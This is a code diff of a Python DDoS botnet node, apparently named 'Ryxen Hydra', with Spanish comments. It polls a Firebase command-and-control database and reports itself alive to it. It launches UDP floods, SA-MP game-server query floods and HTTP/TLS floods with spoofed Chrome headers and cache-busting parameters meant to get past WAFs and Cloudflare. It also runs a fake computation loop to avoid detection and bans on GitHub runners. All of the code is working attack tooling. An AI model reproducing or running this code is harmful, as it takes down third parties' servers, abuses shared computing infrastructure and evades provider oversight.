@@ -1,117 +1,117 @@
 import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math
 
-# CONFIGURACIÓN RYXEN V28
+# CONFIGURACIÓN RYXEN HYDRA
 DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
 NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"
 
-# --- MÓDULO DE EVASIÓN Y ESTABILIDAD (Gatitos y Mates) ---
-def stability_shield():
-    """Mantiene la CPU activa con patrones que parecen tareas legítimas"""
+# --- DISFRAZ DE GITHUB (EVASIÓN DE BAN) ---
+def github_stability_module():
+    """Mantiene la VM activa realizando cálculos de análisis de datos falsos"""
     while True:
-        # Simulamos cálculos de análisis de datos
-        for _ in range(500):
-            _ = math.sqrt(random.random()) ** 2
-        # Simulación de 'heartbeat' para que GitHub vea actividad constante
-        time.sleep(random.uniform(0.1, 0.5))
+        _ = [math.sqrt(i) * math.sin(i) for i in range(1000)]
+        time.sleep(random.uniform(1, 3))
 
-# --- MOTOR L4 POTENCIADO (SAMP & UDP Payloads) ---
-def l4_extreme_engine(ip, port, end_time, method):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # Optimizamos el buffer del sistema para evitar cuellos de botella locales
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048 * 1024)
-    
-    # Payload de consulta real para SAMP (Query Packet 'i')
-    if ".samp" in method:
-        try:
-            ip_octets = [int(i) for i in ip.split('.')]
-            payload = b"SAMP" + struct.pack('BBBB', *ip_octets) + struct.pack('H', int(port)) + b'i'
-        except: payload = random._urandom(1024)
-    else:
-        # UDP Flood con payload de alta entropía
-        payload = random._urandom(1400)
+# --- GENERADOR DE HEADERS REALISTAS (BYPASS WAF) ---
+def get_modern_headers():
+    versions = ["120.0.0.0", "121.0.0.0", "122.0.0.0"]
+    v = random.choice(versions)
+    return {
+        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8',
+        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Cache-Control': 'no-cache'
+    }
 
-    while time.time() < end_time:
-        try:
-            # Enviamos ráfagas para maximizar el throughput
-            for _ in range(50):
-                sock.sendto(payload, (ip, int(port)))
-        except: pass
-
-# --- MOTOR L7 (Bypass & TLS Extreme) ---
-async def l7_extreme_engine(target, end_time, semaphore):
-    # Imitamos la huella digital (JA3) de Chrome 120/121
+# --- MOTOR L7 (HTTPS / TLS / BYPASS) ---
+async def layer7_engine(target, end_time, semaphore, method):
+    # TLS Fingerprint imitando Chrome (JA3)
     ctx = ssl.create_default_context()
-    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:TLS_AES_128_GCM_SHA256')
-    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
-
-    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, ttl_dns_cache=600)
+    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256')
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
     
-    async with aiohttp.ClientSession(connector=conn) as session:
+    connector = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
+    async with aiohttp.ClientSession(connector=connector) as session:
         while time.time() < end_time:
             async with semaphore:
                 try:
-                    # Bypass de caché mediante parámetros aleatorios y rutas dinámicas
-                    dynamic_target = f"{target}?data={random.getrandbits(64)}"
-                    headers = {
-                        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'Referer': target
-                    }
-                    # Usamos GET pero cerramos rápido para maximizar RPS
-                    async with session.get(dynamic_target, headers=headers, timeout=1, allow_redirects=False) as r:
-                        await r.release()
+                    # Bypass de caché dinámico para forzar 504 Gateway Timeout
+                    url = f"{target}?__cf_chl_tk={random.getrandbits(64)}&s={random.randint(1,99999)}"
+                    headers = get_modern_headers()
+                    
+                    if method == ".tls":
+                        async with session.options(url, headers=headers, timeout=1) as r:
+                            await r.release()
+                    else: # .bypass o .httpflood
+                        async with session.get(url, headers=headers, timeout=1) as r:
+                            await r.release()
                 except: continue
 
-def run_l7_process(target, end_time):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    # Semáforo de alta concurrencia (320 hilos lógicos)
-    sem = asyncio.Semaphore(25000)
-    tasks = [l7_extreme_engine(target, end_time, sem) for _ in range(420)]
-    loop.run_until_complete(asyncio.gather(*tasks))
+# --- MOTOR L4 (UDP / SAMP) ---
+def layer4_engine(ip, port, end_time, method):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048 * 1024) # Buffer de 2MB
+    
+    if method == ".samp":
+        # Payload real de Query 'i' para estresar el servidor GTA
+        try:
+            ip_octs = [int(i) for i in ip.split('.')]
+            payload = b"SAMP" + struct.pack('BBBB', *ip_octs) + struct.pack('H', int(port)) + b'i'
+        except: payload = random._urandom(1024)
+    else: # .udptest masivo (Gbps)
+        payload = random._urandom(1350) # Cerca del MTU para llenar el "tubo"
 
+    while time.time() < end_time:
+        try:
+            for _ in range(20): # Ráfagas de 20 paquetes
+                sock.sendto(payload, (ip, int(port)))
+        except: break
+
+# --- ORQUESTADOR ---
 async def main():
-    nid = f"RX-NODE-{random.randint(1000, 9999)}"
-    threading.Thread(target=stability_shield, daemon=True).start()
+    nid = f"RX-{random.randint(100, 999)}"
+    threading.Thread(target=github_stability_module, daemon=True).start()
     
     async with aiohttp.ClientSession() as session:
-        last_stamp = ""
+        last_s = ""
         while True:
             try:
-                # Reporte de estado a Firebase
+                # Reporte de Nodo Vivo
                 await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                 
-                async with session.get(DB_URL, timeout=5) as r:
+                async with session.get(f"{DB_URL}.json", timeout=5) as r:
                     data = await r.json()
                 
-                if data and data.get('stamp') != last_stamp:
-                    last_stamp = data['stamp']
-                    method, target, duration = data['method'], data['target'], int(data['time'])
+                if data and data.get('stamp') != last_s:
+                    last_s = data['stamp']
+                    m, t, d = data['method'], data['target'], int(data['time'])
+                    if d <= 0: continue
                     
-                    if duration > 0:
-                        end_attack = time.time() + duration
-                        if ".udp" in method or ".samp" in method:
-                            h, p = target.split(':')
-                            for _ in range(400): # Soltamos la cadena a los runners (400 hilos)
-                                threading.Thread(target=l4_extreme_engine, args=(h, int(p), end_attack, method), daemon=True).start()
-                        else:
-                            # Multiprocesamiento para saturar todos los núcleos de la runner
-                            for _ in range(multiprocessing.cpu_count()):
-                                multiprocessing.Process(target=run_async_process, args=(target, end_attack), daemon=True).start()
+                    end = time.time() + d
+                    if ".udp" in m or ".samp" in m:
+                        host, port = t.split(':')
+                        for _ in range(500): # 500 hilos sin correa
+                            threading.Thread(target=layer4_engine, args=(host, port, end, m), daemon=True).start()
+                    else:
+                        # Lanzar en todos los núcleos de la VM
+                        for _ in range(multiprocessing.cpu_count()):
+                            p = multiprocessing.Process(target=run_l7, args=(t, end, m))
+                            p.start()
             except: pass
             await asyncio.sleep(2)
 
-def run_async_process(target, end_time):
-    # Función auxiliar para el multiprocesamiento
+def run_l7(t, e, m):
     loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    sem = asyncio.Semaphore(25000)
-    tasks = [l7_extreme_engine(target, end_time, sem) for _ in range(420)]
+    sem = asyncio.Semaphore(1500)
+    tasks = [layer7_engine(t, e, sem, m) for _ in range(250)]
     loop.run_until_complete(asyncio.gather(*tasks))
 
 if __name__ == "__main__":
     asyncio.run(main())
-                                                        
+
